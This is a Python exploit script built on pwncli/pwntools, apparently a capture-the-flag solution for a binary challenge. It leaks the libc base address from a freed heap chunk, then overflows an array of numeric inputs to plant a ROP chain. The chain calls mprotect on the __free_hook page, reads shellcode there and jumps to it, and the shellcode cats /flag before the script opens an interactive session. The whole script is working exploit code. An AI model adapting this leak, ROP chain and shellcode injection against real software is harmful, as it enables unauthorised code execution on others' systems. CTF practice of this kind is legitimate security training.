#!/usr/bin/python3
# -*- encoding: utf-8 -*-
# author: lynne
from pwncli import *

cli_script()

io: tube = gift['io']
elf: ELF = gift['elf']
libc: ELF = gift['libc']


def assign_val(chunk_size, data, arrays):
    io.sendafter("hhh\n", "1".ljust(4, "\x00"))
    io.sendlineafter("size???\n", str(chunk_size))
    io.sendline(data)
    io.recvline("Lucky Numbers\n")
    for i in arrays:
        io.sendline(str(i))


def get_array(*indexs):
    arr = [0] * 16
    for i in indexs:
        arr[i] = 3
    return arr


def leak_addr():
    arr = get_array(15, 13, 2, 3, 4, 14)
    assign_val(0x500, "a"*8, arr)
    io.sendafter("hhh\n", "2".ljust(4, "\x00"))
    libc_base = recv_libc_addr(io, offset=0x1ebbe0)
    log_libc_base_addr(libc_base)
    libc.address = libc_base


def rop_attack():
    arr = get_array(15, 1, 2, 3, 4, 14, 6)
    assign_val(0x10, "deadbeef", arr)
    io.sendafter("hhh\n", "2".ljust(4, "\x00"))
    io.sendafter("xmki\n", cyclic(0x200, n=8))
    for _ in range(0x42):
        io.sendline(str(0x61616161))
    io.sendline("-")
    io.sendline("-")
    io.sendline(str(0x61616161))
    io.sendline(str(0x61616161))

    rop = ROP(libc)
    target_addr = libc.sym['__free_hook'] & ~0xfff
    rop.mprotect(target_addr, 0x1000, 7)
    rop.read(0, target_addr, 0x600)
    rop.call(target_addr)
    print(rop.dump())
    payload = rop.chain()

    for i in range(0, len(payload), 4):
        num = u32(payload[i:i+4])
        io.sendline(str(num))
    for _ in range(0x200-0x42-4-(len(payload) // 4)):
        io.sendline(str(0x61616161))
    
    sleep(1)

    io.sendline(b"\x90"*0x100 + asm(shellcraft.cat("/flag")))
    flag = io.recvregex("flag{.*}")
    if flag:
        log_ex(f"Get flag: {flag}")
    else:
        errlog_ex("Cannot get flag!")
    io.interactive()


def exp():
    leak_addr()
    rop_attack()

if __name__ == "__main__":
    exp()